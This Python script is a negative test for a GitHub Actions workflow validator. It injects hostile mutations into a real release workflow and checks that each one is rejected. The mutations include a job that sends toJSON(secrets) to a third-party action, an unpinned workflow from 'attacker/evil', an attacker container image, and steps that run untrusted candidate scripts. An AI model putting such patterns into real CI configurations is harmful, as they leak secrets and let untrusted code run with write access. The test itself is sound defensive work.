#!/usr/bin/env python3
"""NEGATIVE TEST of the workflow validator.

A gate you have never seen fail is not tested: validate-workflow.py could be
saying "all OK" because it looks at nothing. Here the real workflow is broken on
purpose, one rule per mutation, and the validator is required to return 1.

Each mutation corresponds to a concrete, documented way of compromising the
supply chain (a trigger that runs text written by a stranger, a token in a job
that runs untrusted code, an action repointed through its tag, a secret
interpolated towards a third-party action...). If any of them stops being
detected, the validator is worthless and this suite goes red.

EXIT CODES
  0  every declared case ran and every mutation was detected
  1  some mutation PASSED the validator (open hole)
  2  the test could not run, or SOME CASE could not run

WHY A MISSING ANCHOR NO LONGER ABORTS
  The mutations are applied by string replacement over the real workflow, so an
  anchor that stops matching is a case that does not run. It used to call
  sys.exit(2) on the first miss - and when Dependabot bumped actions/checkout,
  the hardcoded pin stopped matching and ELEVEN of the seventeen declared cases
  silently stopped running, including "the real workflow, untouched, must pass".
  The suite still printed six PASS.

  Two changes, and neither is "update the pin": the checkout anchor is DERIVED
  from the workflow, and a case whose anchor is missing is recorded as COULD NOT
  MEASURE and the rest go on running. The final line states how many cases were
  declared against how many were measured, because a suite that quietly shrinks
  reads exactly like a suite that passes.
"""
import pathlib
import re
import subprocess
import sys

ROOT = pathlib.Path(__file__).resolve().parents[3]
VALIDATOR = ROOT / "scripts/gh/tests/validate-workflow.py"
WORKFLOW = ROOT / ".github/workflows/release.yml"

if not WORKFLOW.is_file() or not VALIDATOR.is_file():
    print(f"  COULD NOT MEASURE: {WORKFLOW} or {VALIDATOR} is missing (rc 2)", file=sys.stderr)
    sys.exit(2)
try:
    import yaml  # noqa: F401  (the validator we are about to invoke needs it)
except Exception as e:  # noqa: BLE001
    print(f"  COULD NOT MEASURE: PyYAML is missing ({e}) (rc 2)", file=sys.stderr)
    sys.exit(2)

WF = WORKFLOW.read_text()
import tempfile

TMP = pathlib.Path(tempfile.mkdtemp(prefix="wfmut-"))
PASS, FAIL, DECLARED = 0, 0, 0
UNMEASURED = []


class Unmeasured(str):
    """A mutation whose anchor no longer matches the workflow.

    It is neither a pass nor a failure: it is a case that did not run. Carrying
    it as a value instead of exiting lets the remaining cases run and keeps the
    accounting honest.
    """

# Anchors into the REAL workflow. If any of them stops matching, `rep()` aborts
# with rc=2 ("could not measure") instead of silently testing nothing.
CHECKOUT_GATES = """    permissions:
      contents: read   # nothing else: this job does not publish
    steps:"""
VERIFY_HDR = """  verify:
    name: Gates over the candidate tree"""
PROMOTE_HDR = """  promote:
    name: Publish stable"""
# DERIVED, never written down: the pin changes on its own every time Dependabot
# updates the action, and a literal copy of it here is a trap that arms itself.
_pin = re.search(
    r"(?P<action>[A-Za-z0-9_.\-]+/[A-Za-z0-9_.\-]+)@[0-9a-f]{40}(?: *# *v?[0-9][0-9A-Za-z.\-]*)?",
    WF)
CHECKOUT_SHA = _pin.group(0) if _pin else None
CHECKOUT_TAG = _pin.group("action") + "@v5" if _pin else None


def rep(old, new):
    """Apply one mutation, or hand back an Unmeasured marker.

    Returning instead of exiting is the whole point: one drifted anchor must
    cost one case, not every case declared after it.
    """
    if old is None:
        return Unmeasured("<no SHA-pinned action found in the workflow>")
    if old not in WF:
        return Unmeasured(old[:60])
    return WF.replace(old, new, 1)


def case(label, text, expect=1):
    global PASS, FAIL, DECLARED
    DECLARED += 1
    if isinstance(text, Unmeasured):
        print(f"  UNMEAS  {label:<56s} anchor not found: {str(text)!r}")
        UNMEASURED.append(label)
        return
    p = TMP / "wf.yml"
    p.write_text(text)
    r = subprocess.run([sys.executable, str(VALIDATOR), str(p)],
                       capture_output=True, text=True)
    if r.returncode == expect:
        print(f"  PASS  {label:<58s} rc={r.returncode}")
        PASS += 1
    else:
        print(f"  FAIL  {label:<58s} rc={r.returncode} (expected {expect})")
        print("        the validator did NOT detect this mutation: open hole")
        FAIL += 1


print("== Mutations the validator MUST reject (rc 1)")

case("pull_request_target trigger",
     rep("on:\n  schedule:", "on:\n  pull_request_target:\n  schedule:"))
case("issue_comment trigger (text written by a stranger)",
     rep("on:\n  schedule:", "on:\n  issue_comment:\n    types: [created]\n  schedule:"))
case("push trigger",
     rep("on:\n  schedule:", "on:\n  push:\n    branches: [main]\n  schedule:"))
case("the job that runs the candidate with contents:write",
     rep(CHECKOUT_GATES, CHECKOUT_GATES.replace("contents: read", "contents: write")))
case("permissions: write-all as a STRING (must not crash, must FAIL)",
     rep(CHECKOUT_GATES,
         CHECKOUT_GATES.replace("    permissions:\n      contents: read   # nothing else: this job does not publish",
                                "    permissions: write-all")))
case("no workflow-level permissions {}",
     rep("permissions: {}\n", ""))
case("action pinned by a mutable tag instead of a SHA",
     rep(CHECKOUT_SHA, CHECKOUT_TAG))
case("${{ }} interpolation of data inside a run",
     rep("          set -euo pipefail\n          git config user.name",
         '          set -euo pipefail\n'
         '          echo "${{ github.event.head_commit.message }}"\n'
         "          git config user.name"))
case("the repo's own secret in env",
     rep("          GH_TOKEN: ${{ github.token }}",
         "          GH_TOKEN: ${{ secrets.PUBLISH_PAT }}"))
case("covert secrets context: toJSON(secrets) towards a third party",
     rep(PROMOTE_HDR,
         "  exfil:\n"
         "    runs-on: ubuntu-latest\n"
         "    permissions:\n      contents: read\n"
         "    steps:\n"
         "      - uses: thirdparty/action@0000000000000000000000000000000000000000\n"
         "        with:\n          data: ${{ toJSON(secrets) }}\n\n" + PROMOTE_HDR))
case("a second job with contents:write",
     rep(PROMOTE_HDR,
         "  extra:\n    runs-on: ubuntu-latest\n"
         "    permissions:\n      contents: write\n"
         "    steps:\n      - run: echo hello\n\n" + PROMOTE_HDR))
case("third-party reusable workflow UNPINNED (jobs.<id>.uses)",
     rep(PROMOTE_HDR,
         "  reusable:\n    uses: attacker/evil/.github/workflows/x.yml@main\n"
         "    permissions:\n      contents: read\n\n" + PROMOTE_HDR))
case("mutable container image in the job that runs the candidate",
     rep(VERIFY_HDR, VERIFY_HDR + "\n    container: attacker/image:latest"))
case("candidate checkout WITH persisted credentials (token handed to untrusted code)",
     rep("""        with:
          ref: ${{ needs.resolve.outputs.source_sha }}
          fetch-depth: 0
          path: source
          persist-credentials: false""",
         """        with:
          ref: ${{ needs.resolve.outputs.source_sha }}
          fetch-depth: 0
          path: source"""))
case("the job with write access runs a script from the candidate tree",
     rep("""      - name: Build the stable tree
        working-directory: source
        run: |""",
         """      - name: Injected step
        run: bash source/scripts/gates/x.sh

      - name: Build the stable tree
        working-directory: source
        run: |"""))
case("the job with write access runs the gates the candidate ships",
     rep("""      - name: gate-plugin-version (stable channel)""",
         """      - name: Injected gates step
        run: bash source/scripts/gates/run-all.sh

      - name: gate-plugin-version (stable channel)"""))
case("defaults.run.shell changed (bash -n would stop measuring what runs)",
     rep("permissions: {}\n", "permissions: {}\ndefaults:\n  run:\n    shell: python\n"))

print()
print("== The validator must tell 'could not measure' (rc 2) from 'it is wrong' (rc 1)")
r = subprocess.run([sys.executable, str(VALIDATOR), str(TMP / "does-not-exist.yml")],
                   capture_output=True, text=True)
case_ok = r.returncode == 2
DECLARED += 1
print(f"  {'PASS' if case_ok else 'FAIL'}  {'missing workflow -> rc 2':<58s} rc={r.returncode}")
PASS, FAIL = (PASS + 1, FAIL) if case_ok else (PASS, FAIL + 1)

p = TMP / "broken.yml"
p.write_text("on: [schedule\njobs: {")
r = subprocess.run([sys.executable, str(VALIDATOR), str(p)], capture_output=True, text=True)
case_ok = r.returncode == 2
DECLARED += 1
print(f"  {'PASS' if case_ok else 'FAIL'}  {'corrupt YAML -> rc 2':<58s} rc={r.returncode}")
PASS, FAIL = (PASS + 1, FAIL) if case_ok else (PASS, FAIL + 1)

print()
print("== And the real workflow, untouched, must pass (rc 0 is not dead code)")
r = subprocess.run([sys.executable, str(VALIDATOR), str(WORKFLOW)],
                   capture_output=True, text=True)
case_ok = r.returncode == 0
DECLARED += 1
print(f"  {'PASS' if case_ok else 'FAIL'}  {'real workflow intact -> rc 0':<58s} rc={r.returncode}")
PASS, FAIL = (PASS + 1, FAIL) if case_ok else (PASS, FAIL + 1)

print()
measured = PASS + FAIL
print(f"  {PASS} PASS / {FAIL} FAIL / {len(UNMEASURED)} COULD NOT MEASURE"
      f"   ({measured} of {DECLARED} declared cases actually ran)")
if UNMEASURED:
    print()
    print("  These cases DID NOT RUN. Their anchor no longer matches the workflow,")
    print("  so nothing was proved about them and rc 0 would be a lie:")
    for label in UNMEASURED:
        print(f"    - {label}")
    print("  Fix the anchor, or derive it from the workflow the way the pin is derived.")
sys.exit(1 if FAIL else (2 if UNMEASURED else 0))
